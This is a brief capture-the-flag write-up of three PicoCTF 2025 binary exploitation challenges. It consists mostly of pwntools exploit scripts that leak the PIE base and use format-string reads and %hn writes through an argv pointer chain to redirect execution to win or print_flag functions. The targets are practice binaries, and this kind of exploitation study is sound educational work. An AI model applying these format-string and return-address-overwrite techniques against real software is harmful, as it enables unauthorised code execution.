# PicoCTF 2025

## Pie time 1

水題

```python
r.recvuntil("main:")
leak=r.recvline().strip()
leak=int(leak, 16)
e.address=leak-e.sym.main
success("PIE base : %s" % hex(e.address))

r.sendlineafter("0x12345:", hex(e.sym.win))

r.interactive()
```

## Pie time 2

Format string

```c
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);
```

Leak return address

```python
r.recvuntil("name:")
r.sendline("%14$p")
leak=int(r.recvline().strip(), 16)
e.address=leak-e.sym.__libc_csu_init
success("PIE base : %s" % hex(e.address))

r.sendline(hex(e.sym.win))

r.interactive()
```

## Echo valley

Format string

```c
    while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    fflush(stdout);
```

Leak return address, RBP

```python
r.sendline("%21$p")
r.recvuntil("distance:")
leak=int(r.recvline().strip(), 16)
e.address=leak-e.sym.main-18
success("PIE base : %s" % hex(e.address))
r.sendline("%20$p")
r.recvuntil("distance:")
rbp=int(r.recvline().strip(), 16)-0x10
success("Old rbp : %s" % hex(rbp))
```


Argv chain

```python
# 0x7fffda60ac38 —▸ 0x7fffda60ad38 —▸ 0x7fffda60afb7 ◂— '/ctf/work/val/valley'

payload="%{}c%{}$hn".format((rbp+8)&0xffff, 20+(0x130-0x70)//8)
r.sendline(payload)
r.recv()

payload="%{}c%{}$hn".format((e.sym.print_flag)&0xffff, 20+(0x1b8-0x70)//8)
r.sendline(payload)
r.recv()

r.interactive()
```